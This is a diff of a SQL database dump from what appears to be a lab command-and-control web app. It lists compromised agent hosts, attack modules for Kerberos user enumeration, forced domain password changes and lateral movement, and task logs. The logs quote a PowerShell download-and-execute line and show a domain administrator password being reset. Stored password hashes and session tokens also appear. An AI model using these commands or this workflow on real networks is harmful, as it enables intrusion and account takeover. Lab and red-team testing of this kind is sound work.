@@ -1,11 +1,11 @@
 -- phpMyAdmin SQL Dump
--- version 5.1.3
+-- version 5.2.0
 -- https://www.phpmyadmin.net/
 --
--- Host: 127.0.0.1
--- Generation Time: May 07, 2023 at 08:07 PM
--- Server version: 10.4.22-MariaDB
--- PHP Version: 7.4.28
+-- Host: localhost
+-- Generation Time: May 14, 2023 at 10:48 PM
+-- Server version: 10.4.25-MariaDB
+-- PHP Version: 8.1.10
 
 SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
 START TRANSACTION;
@@ -132,7 +132,7 @@ CREATE TABLE `auth_user` (
 --
 
 INSERT INTO `auth_user` (`id`, `password`, `last_login`, `is_superuser`, `username`, `first_name`, `last_name`, `email`, `is_staff`, `is_active`, `date_joined`) VALUES
-(1, 'pbkdf2_sha256$390000$8lV0oNwRoZ6jEeHihnWrmm$k0fa8lw58n7yx16cuHjGh1RPZDEJNOsXZqGjbWA58q8=', '2023-05-07 13:17:04.392110', 1, 'admin', '', '', 'admin@gmail.com', 1, 1, '2022-10-20 10:10:02.435570'),
+(1, 'pbkdf2_sha256$260000$lW24ZRCnjHBRfl5nMlpZsm$WPOQFyPCT1pf0cxWq9Me65NlqkAkZ8E9u8z9pwfFqCE=', '2023-05-14 16:18:58.387020', 1, 'admin', '', '', 'admin@gmail.com', 1, 1, '2022-10-20 10:10:02.435570'),
 (2, 'pbkdf2_sha256$390000$VcJyCcXjTw3BLzdoAFOs4l$vzeQ5BNSBrTDnreTIz0Ivyaf8+BHyD0XtSvRGsb8M80=', '2022-10-21 18:01:51.788209', 1, 'tamer', '', '', 'tamer@gmail.com', 1, 1, '2022-10-21 18:00:11.000000'),
 (3, 'pbkdf2_sha256$390000$rBKtztMUtF8v2WViZlwh44$xM7mHlGyOQe+JHSXq2wLKha8Woj7XOpOR4D2aj+zJGY=', NULL, 0, 'rana', '', '', 'rana@gmail.com', 0, 1, '2022-10-21 18:41:06.000000'),
 (4, 'pbkdf2_sha256$260000$jV5L1tD0CutfiRzuXnPMFF$pKxOqqYj3GGTCfGPy1x/vGGaXE+cOeeRsTU21CbGNQU=', '2023-03-12 12:54:18.904657', 0, 'hawary', '', '', 'asdjavsliasugfpaispui@gmail.com', 0, 1, '2023-03-12 12:53:25.017954');
@@ -188,7 +188,8 @@ INSERT INTO `blog_agent` (`id`, `name`, `ip`, `hname`, `created_date`, `updated_
 (8, 'EWQDLD', '192.168.116.136', 'metasploitable', '2022-12-18 23:59:57.443649', '2022-12-19', 'www-data'),
 (9, 'VMZBXP', '192.168.19.130', 'DESKTOP-KNTV3C3', '2023-03-06 00:03:35.825569', '2023-03-06', 'MoSa'),
 (10, 'MATEME', '192.168.19.130', 'DESKTOP-KNTV3C3', '2023-03-06 00:09:22.493603', '2023-03-06', 'desktop-kntv3c3\\kerles'),
-(12, 'VZPILP', '192.168.19.130', 'DESKTOP-KNTV3C3', '2023-03-10 23:28:29.335502', '2023-03-11', 'desktop-kntv3c3\\abdulazizaladdinali');
+(12, 'GENERAL', '', 'General for BlackBox ', '2023-03-10 23:28:29.335502', '2023-03-11', 'GENERAL'),
+(13, 'RBPYMU', '192.168.116.181', 'LAB-DC-01', '2023-05-14 00:31:00.787314', '2023-05-14', 'normal\\administrator');
 
 -- --------------------------------------------------------
 
@@ -302,7 +303,29 @@ INSERT INTO `blog_agenttasks` (`id`, `created_date`, `agent_id`, `module_id`, `t
 (99, '2023-03-12 13:32:47.308101', 12, 84, NULL, 1),
 (100, '2023-03-12 13:35:23.869197', 12, 84, NULL, 1),
 (101, '2023-03-12 13:35:26.324669', 12, 84, NULL, 1),
-(102, '2023-03-12 13:35:27.844729', 12, 84, NULL, 1);
+(102, '2023-03-12 13:35:27.844729', 12, 84, NULL, 1),
+(103, '2023-05-14 00:20:52.758822', 12, 111, NULL, 1),
+(104, '2023-05-14 00:22:35.478438', 12, 111, NULL, 1),
+(105, '2023-05-14 00:26:38.885737', 12, 112, NULL, 1),
+(106, '2023-05-14 00:28:47.699489', 12, 112, NULL, 1),
+(107, '2023-05-14 00:31:57.180526', 13, 117, '++++++++++++++++++\r\n	\r\n===============Force\r\nChange\r\nPassword===============\r\n++++++++++++++++++ Exception calling \"DownloadString\" with \"1\" argument(s): \"The remote server returned an error: (404) Not Found.\"\r\nAt line:1 char:86\r\n+ ... ===========;IEX(New-Object Net.WebClient).DownloadString(\'http://192. ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nSet-DomainUserPassword : The term \'Set-DomainUserPassword\' is not recognized as the name of a cmdlet, function, script \r\nfile, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct \r\nand try again.\r\nAt line:1 char:419\r\n+ ... eString \'P@ssw0rd\' -AsPlainText -Force;Set-DomainUserPassword -Identi ...\r\n+                                            ~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Set-DomainUserPassword:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
+(108, '2023-05-14 00:37:20.688561', 13, 117, '++++++++++++++++++\r\n	\r\n===============Force\r\nChange\r\nPassword===============\r\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\r\nWARNING: [Set-DomainUserPassword] Unable to find user \'ahmed\'\r\n++++++++++++++++++ Exception calling \"FindByIdentity\" with \"2\" argument(s): \"The user name or password is incorrect.\r\n\"\r\nAt line:5537 char:9\r\n+         $User = [System.DirectoryServices.AccountManagement.UserPrinc ...\r\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : COMException', 1),
+(109, '2023-05-14 00:41:45.638988', 12, 111, NULL, 1),
+(110, '2023-05-14 00:47:19.432594', 12, 111, NULL, 1),
+(111, '2023-05-14 00:51:37.402921', 12, 112, NULL, 1),
+(112, '2023-05-14 01:10:52.417506', 13, 115, NULL, 1),
+(113, '2023-05-14 01:11:52.667329', 13, 115, NULL, 1),
+(114, '2023-05-14 16:27:11.950831', 13, 115, NULL, 1),
+(115, '2023-05-14 16:28:29.340529', 13, 115, NULL, 1),
+(116, '2023-05-14 16:28:47.064485', 13, 115, NULL, 1),
+(117, '2023-05-14 17:06:47.966239', 13, 118, NULL, 1),
+(118, '2023-05-14 17:08:11.249762', 13, 118, NULL, 1),
+(119, '2023-05-14 17:09:15.016747', 13, 118, NULL, 1),
+(120, '2023-05-14 17:11:49.266763', 13, 118, NULL, 1),
+(121, '2023-05-14 17:27:54.033143', 13, 114, NULL, 1),
+(122, '2023-05-14 17:29:56.243531', 13, 114, NULL, 1),
+(123, '2023-05-14 20:43:02.356463', 13, 117, '++++++++++++++++++\r\n	\r\n===============Force\r\nChange\r\nPassword===============\r\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\r\nVERBOSE: [Set-DomainUserPassword] Attempting to set the password for user \'administrator\'\r\nVERBOSE: [Set-DomainUserPassword] Password for user \'administrator\' successfully reset\r\n++++++++++++++++++ ', 1),
+(124, '2023-05-14 20:46:18.674524', 13, 117, '++++++++++++++++++\r\n	\r\n===============Force\r\nChange\r\nPassword===============\r\nVERBOSE: [Get-PrincipalContext] Using alternate credentials\r\nVERBOSE: [Set-DomainUserPassword] Attempting to set the password for user \'administrator\'\r\nVERBOSE: [Set-DomainUserPassword] Password for user \'administrator\' successfully reset\r\n++++++++++++++++++ ', 1);
 
 -- --------------------------------------------------------
 
@@ -323,8 +346,7 @@ CREATE TABLE `blog_listenerform` (
 --
 
 INSERT INTO `blog_listenerform` (`id`, `interface`, `created_date`, `stoped_date`, `ip`) VALUES
-(33, 'eth0', '2023-05-07 02:22:26.083228', NULL, '192.168.19.133'),
-(34, 'etg0', '2023-05-07 11:20:25.680514', NULL, NULL);
+(33, 'eth0', '2023-05-14 16:19:15.308861', NULL, '192.168.116.129');
 
 -- --------------------------------------------------------
 
@@ -461,7 +483,7 @@ INSERT INTO `blog_modules` (`id`, `module_name`, `module_type`, `created_date`, 
 (115, 'sharp', 3, '2023-05-05 15:15:19.000000', NULL, NULL),
 (116, 'UserGeneralInfo', 3, '2023-05-05 20:22:59.000000', NULL, NULL),
 (117, 'forceChangePassDomainUserPassword', 3, '2023-05-06 01:13:03.000000', NULL, NULL),
-(118, 'LateralMovWinRM', 3, '2023-05-06 16:15:41.000000', NULL, NULL);
+(118, 'LateralMov', 3, '2023-05-06 16:15:41.000000', '', '');
 
 -- --------------------------------------------------------
 
@@ -670,7 +692,8 @@ INSERT INTO `django_admin_log` (`id`, `action_time`, `object_id`, `object_repr`,
 (183, '2023-05-04 15:14:34.301031', '108', 'open_FTPserver', 1, '[{\"added\": {}}]', 10, 1),
 (184, '2023-05-04 15:14:38.667446', '109', 'open_PY_UploadServer', 1, '[{\"added\": {}}]', 10, 1),
 (185, '2023-05-04 15:14:43.991959', '110', 'open_FTP_UploadServer', 1, '[{\"added\": {}}]', 10, 1),
-(186, '2023-05-05 00:21:01.933492', '111', 'UserEnumwithKerbrute', 1, '[{\"added\": {}}]', 10, 1);
+(186, '2023-05-05 00:21:01.933492', '111', 'UserEnumwithKerbrute', 1, '[{\"added\": {}}]', 10, 1),
+(187, '2023-05-14 17:13:20.681408', '118', 'LateralMov', 2, '[{\"changed\": {\"fields\": [\"Module name\"]}}]', 10, 1);
 
 -- --------------------------------------------------------
 
@@ -791,11 +814,14 @@ INSERT INTO `django_session` (`session_key`, `session_data`, `expire_date`) VALU
 ('7d43wzw3iq69ernwtmiwyzcam1mkccje', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ6iw:mBH98v5Fev0oNFBaIc1iS3NfalgTQmC8OppHQZ9FuRM', '2023-03-20 09:01:38.900189'),
 ('7ed2ignogasv35ggmg9us5h1xeukdn5b', 'eyJhZ2VudE5hbWUiOiJWTVpCWFAifQ:1pYyKF:4E28SWMHOc4WkXm-ZmTYxytIUW2zGIO8St55JlAW8hM', '2023-03-20 00:03:35.835815'),
 ('83jqz85jvm1qbdyqjy0dknve3rt55mte', '.eJxVjDsOwjAQBe_iGln4l40p6TmDtd61cQDZUpxUiLuTSCmgfTPz3iLgupSw9jSHicVFKHH63SLSM9Ud8APrvUlqdZmnKHdFHrTLW-P0uh7u30HBXrY6KYXMo_MUrTI64whDHhQgqA3x2ZDV7C1g9pqzZe2ZrIvgCVx2hsTnC-f0OAs:1pQ8F4:4m6URE6Am8UN2kNzSgl6ZWaK-ic4Er8h4aM1COIw9Y0', '2023-02-23 14:49:42.637533'),
+('896nw0nycmm85bf6jnflibqp7pupoo2o', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pxzt5:MnMHfqt72MX9LP7ycwShko8j28Hse6jAnZUoTKCtaWQ', '2023-05-28 00:46:59.787570'),
 ('8fgbx9b6g1atklpshdeu0d6664154x54', 'eyJhZ2VudE5hbWUiOiJWTVpCWFAifQ:1pYyKW:0rv2XM76DvghAoTPMH5UZGsgbl1kNPrxk4MoMuQLSQQ', '2023-03-20 00:03:52.090563'),
 ('8ijdimq80ftwrqbf2j6556z5p8fwrjzp', 'eyJhZ2VudE5hbWUiOiJFV1FETEQifQ:1pMHCZ:nVQltl3O1f6bO-EWDI3hOXJBiBNBfi8DI8VyrSGSEQ0', '2023-02-12 23:35:11.984750'),
+('8lu4152vximbzm1uuzuuxrjvovqj30sq', '.eJxVjMsOwiAQRf-FtSEy4AAu3fcbyPCSqoGktCvjv0uTLnR7zrn3zRxta3FbT4ubI7sywU6_zFN4prqL-KB6bzy0ui6z53vCD9v51GJ63Y7276BQL2OdowJ51hZiDqABQSUMIRJeSCJSEsJqg5DISrAgCfOwJqhBsgGf2ecL3vM4Nw:1pyER0:rPkE3wUg9ytpZA19sWj1GbNAg-k4eTVH42BtekPBIho', '2023-05-28 16:18:58.501080'),
 ('8txylzc9ub35p5xftgvszafz0i2r2m3x', '.eJxVjEEOwiAQRe_C2hAITAGX7j0DGZhBqgaS0q6Md9cmXej2v_f-S0Tc1hq3wUucSZyFFqffLWF-cNsB3bHdusy9rcuc5K7Igw557cTPy-H-HVQc9VsXT2AUWHCTzw6JQQVGsD6DKow4hQA6WMOUSsoaMQVwir0JTiVCL94f5qs4RQ:1p6KDZ:bcD3v0FW8ykWwcCFAv1jLixnycg4iYHEV8FY0MVLP_g', '2022-12-30 23:34:17.920866'),
 ('9mu5xksxhxxvgyow4zr76e7j5l31y9qh', '.eJxVjDsOwjAQBe_iGll21r-lpOcMlj9rHEC2FCcV4u4QKQW0b2bei_mwrdVvgxY_Z3Zmkp1-txjSg9oO8j20W-ept3WZI98VftDBrz3T83K4fwc1jPqtFYBIDi1MQlqFGtHSZECqLK2hkqMhJ4pTRusSAaLTAYW1hChUAgjs_QGfdjZx:1oqwCm:kUwZ0hbWFTi6tELkYZs9N6Ryr3jN95y168T5zXOXruo', '2022-11-18 12:53:52.923814'),
 ('a0ajsutl85m6ptc46bzlfkuclcss7dju', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pYyPq:YPqYPq7o7M0dVnw-KZ3BJ9Vh6-cOwIVA3hr8kSM9XeQ', '2023-03-20 00:09:22.502188'),
+('aqq5lgaku2m0ehg0o1ujyyrkpm8pxigg', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyFFf:HNmbvQ3Tnk-OXJuEe_Uv8ubWsqkiYW8IqSUJFQGfRM0', '2023-05-28 17:11:19.681685'),
 ('asxahoj68y9in2pxxa9e2ketn1l3k58q', 'eyJhZ2VudE5hbWUiOiJWWlBJTFAifQ:1pbK4G:tg9XZgFKONPSw6lgIGTJa0-pGag6YqsZES7TOXqZzBU', '2023-03-26 11:40:48.091294'),
 ('bh08okh8kezplworz8vxiiuqmzeqnxkw', '.eJxVjEEOwiAQRe_C2hAITAGX7j0DGZhBqgaS0q6Md9cmXej2v_f-S0Tc1hq3wUucSZyFFqffLWF-cNsB3bHdusy9rcuc5K7Igw557cTPy-H-HVQc9VsXT2AUWHCTzw6JQQVGsD6DKow4hQA6WMOUSsoaMQVwir0JTiVCL94f5qs4RQ:1p6K3A:cLj8osX_cunL9ripRjL4cUw6V0O8f3Xz3uZVglf6rVM', '2022-12-30 23:23:32.601451'),
 ('bvx2pavxp45j9vbjnrh3nqbx89vwzqbb', 'eyJhZ2VudE5hbWUiOiJFV1FETEQifQ:1p73xQ:MuM7FuU92x37W4U4lX3WBBuYh4W-_nLAoGMYl9h7TrE', '2023-01-02 00:24:40.351377'),
@@ -822,6 +848,7 @@ INSERT INTO `django_session` (`session_key`, `session_data`, `expire_date`) VALU
 ('j5jprayidvvv3fpkt00wopfrtozw1cjr', 'eyJhZ2VudE5hbWUiOiJFV1FETEQifQ:1pNi6U:O9l0sRn8HG3LcTcgKQqWBMnA6zVNGRMAV49BvYMgW8k', '2023-02-16 22:30:50.550688'),
 ('jqsxwfzkjx6ctt07m1imbkigb6nv7y0d', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ7Ga:xpghpn6y5GAWMe8OrzmQcdFG0zIB9KVAYFmioj8O_5E', '2023-03-20 09:36:24.511413'),
 ('knesz529jy1dp8qundjqxkaaygmeugd9', 'eyJhZ2VudE5hbWUiOiJETVJCR1kifQ:1p6LkW:xcApsYI3PKgDoCiihXwJQJBXU_DXfcXaH__xxC_zRKo', '2022-12-31 01:12:24.912974'),
+('lskjp5zbt0zad01cyv0pqkdmvu8wzfdj', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pxzea:EoJM14TZQybmuwwkuaRKU3eEeIhzYVFOnGuqUV3eqb0', '2023-05-28 00:32:00.659260'),
 ('m2f688bvtn4iffzr6tfetq24r62mftyn', '.eJxVjDsOwjAQBe_iGll21r-lpErDGSJ_NiQQxVLsVIi740gpoH0zb95s8Hudhr3QNsyJXZlkl98t-Pii9QDp6ddH5jGvdZsDPxR-0sLvOdFyO92_wOTL1N4KQESHFjohrUKNaKkzIFWS1tCYgiEnRqeM1mMACE57FNYSolARwLdopVJbqacls88Xtl46pw:1p3PPO:Uqpt1kXfpt-KMpiQl6VVEzWM0smoweZ_m-3w5gjNKHk', '2022-12-22 22:30:26.830553'),
 ('mplryir6e3v1g7k7xq4snb9s21eskgc8', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ7db:jc8CIfTuN59I6tnhQJZkNm4f5nUzSpGZ3XfWBjnyQRM', '2023-03-20 10:00:11.552191'),
 ('n3i25679ihytj64ymjnxmuu5x6eqdx28', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ6r8:GlYBwbt9eDz44LlCFneyUbxJ7OaBOJ-Rw8kzBMLUO7A', '2023-03-20 09:10:06.349216'),
@@ -838,11 +865,13 @@ INSERT INTO `django_session` (`session_key`, `session_data`, `expire_date`) VALU
 ('qhfe8zvgs7aftnbbnf57qufu0b3c66cj', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ7Il:AxxfyHFnv0AhiN2eTuMdHv5HeGjb3mxnDjaHGV5iF6w', '2023-03-20 09:38:39.274604'),
 ('s5rib14hicq2xpbjbiwb0hzoighsex2m', '.eJxVjEEOwiAQRe_C2hAITAGX7j0DGZhBqgaS0q6Md9cmXej2v_f-S0Tc1hq3wUucSZyFFqffLWF-cNsB3bHdusy9rcuc5K7Igw557cTPy-H-HVQc9VsXT2AUWHCTzw6JQQVGsD6DKow4hQA6WMOUSsoaMQVwir0JTiVCL94f5qs4RQ:1pMGqg:2LWHayIH8ueR7TV-sVuFyXXZZ7fq4PqRnIfZ6KQ249k', '2023-02-12 23:12:34.339617'),
 ('t4rmg0fh6owsfqeeghh3fvm2ev2mv495', '.eJxVjDEOwyAQBP9CHSEQPgMpU6XxG6yDO4ITy0gGV1H-HltykbQ7s_MWI24tj1vldZxIXIUWl98tYHzxcgB64vIoMpalrVOQhyJPWuVQiOfb6f4FMta8v5MjMAo6sL2LFolBeUboXASVGLH3HrTvDFNIIWrE4MEqdsZbFQjdHm1c216681zE5wsXOjx7:1p5oDC:IJ7G8tbamIm6MGMkKQFUPEQJ3pZWIUf6vfDtZTnh4RY', '2022-12-29 13:23:46.107247'),
+('tlb6x27u3oj65yk856x8ka63ur1zaq0e', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pxzdc:z2X6zSTe_p458RPAsyRkJrlxeJJKnZ6ZOCRylL1lQ54', '2023-05-28 00:31:00.792182'),
 ('u38xytwv769vh9jt2v1tepeiupyyibev', '.eJxVjEEOwiAQRe_C2hAITAGX7j0DGZhBqgaS0q6Md9cmXej2v_f-S0Tc1hq3wUucSZyFFqffLWF-cNsB3bHdusy9rcuc5K7Igw557cTPy-H-HVQc9VsXT2AUWHCTzw6JQQVGsD6DKow4hQA6WMOUSsoaMQVwir0JTiVCL94f5qs4RQ:1p72iK:A1SnE4n_dIzvNSkiRQkK08tkcGhPQWna39ZI1qIFgak', '2023-01-01 23:05:00.761896'),
 ('umstiilj4uhwjhzdfongnl2xpaq3d4g3', 'eyJhZ2VudE5hbWUiOiJWWlBJTFAifQ:1pbL7S:OBfmzk5QZNh444Pbga6LOU-NFN2qg-xfG_4V5QHnIpU', '2023-03-26 12:48:10.603648'),
 ('uxhibwv0zimb8ufqtghsxe3336uvhtvu', 'eyJhZ2VudE5hbWUiOiJFV1FETEQifQ:1pMHBu:zf1CgI-UmrMft3u8GtEGAOFqgSgiYW2UWL2gHHTgbKg', '2023-02-12 23:34:30.703866'),
 ('va1wzymphjoo04osdbc2dvatlrskk7gu', 'eyJhZ2VudE5hbWUiOiJOR0ZaUEgifQ:1p5vvj:NNcPL2lZfWoO4KXzXF_1FJmQmVoJ6mJI-6aT9B37EAs', '2022-12-29 21:38:15.114521'),
 ('vnab4fh1695xtwpee269b9tinyciw72w', '.eJxVjDsOwjAQBe_iGll21r-lpOcMlj9rHEC2FCcV4u4QKQW0b2bei_mwrdVvgxY_Z3Zmkp1-txjSg9oO8j20W-ept3WZI98VftDBrz3T83K4fwc1jPqtFYBIDi1MQlqFGtHSZECqLK2hkqMhJ4pTRusSAaLTAYW1hChUAgjs_QGfdjZx:1olTI4:vWi9GqL4cENxdjVNG4d-AmN2zhFT11VAtusJF2hIcE4', '2022-11-03 11:00:44.367033'),
+('vrikma61eyt87qmkbdf8vsanwxwmka05', 'eyJhZ2VudE5hbWUiOiJSQlBZTVUifQ:1pyFGL:heuH9QM3a3ACX6P-822V6rrMpTCOs8RnflvqncVreg8', '2023-05-28 17:12:01.764935'),
 ('wedkg9k6gkqs0wuvzyl44f7lm2dtpbiw', '.eJxVjDsOwjAQBe_iGll21r-lpErDGSJ_NiQQxVLsVIi740gpoH0zb95s8Hudhr3QNsyJXZlkl98t-Pii9QDp6ddH5jGvdZsDPxR-0sLvOdFyO92_wOTL1N4KQESHFjohrUKNaKkzIFWS1tCYgiEnRqeM1mMACE57FNYSolARwLdopVJbqacls88Xtl46pw:1p3Pkg:su_liNRKV4JIRIO9PZU6ndQHRzqHxz_ZsiPLhE80FOQ', '2022-12-22 22:52:26.564398'),
 ('wswalagvqmxvxhh8n7z4126984gmwyfs', '.eJxVjDsOwjAQBe_iGll21r-lpOcMlj9rHEC2FCcV4u4QKQW0b2bei_mwrdVvgxY_Z3Zmkp1-txjSg9oO8j20W-ept3WZI98VftDBrz3T83K4fwc1jPqtFYBIDi1MQlqFGtHSZECqLK2hkqMhJ4pTRusSAaLTAYW1hChUAgjs_QGfdjZx:1olSuO:0XpsH1tKce17ouHOBos3l7N1oxO6Dyt4Gz9fXGOYV0c', '2022-11-03 10:36:16.138598'),
 ('xp5pobyqnzugf5un7dw66awdksw17ix4', 'eyJhZ2VudE5hbWUiOiJNQVRFTUUifQ:1pZ8zS:_NISdTwboNktgtJTj_9xNmItw5CqV1u4JJTJrZ3TDg0', '2023-03-20 11:26:50.629347'),
@@ -996,13 +1025,13 @@ ALTER TABLE `auth_user_user_permissions`
 -- AUTO_INCREMENT for table `blog_agent`
 --
 ALTER TABLE `blog_agent`
-  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;
+  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
 
 --
 -- AUTO_INCREMENT for table `blog_agenttasks`
 --
 ALTER TABLE `blog_agenttasks`
-  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=103;
+  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=125;
 
 --
 -- AUTO_INCREMENT for table `blog_listenerform`
@@ -1020,7 +1049,7 @@ ALTER TABLE `blog_modules`
 -- AUTO_INCREMENT for table `django_admin_log`
 --
 ALTER TABLE `django_admin_log`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=187;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=188;
 
 --
 -- AUTO_INCREMENT for table `django_content_type`
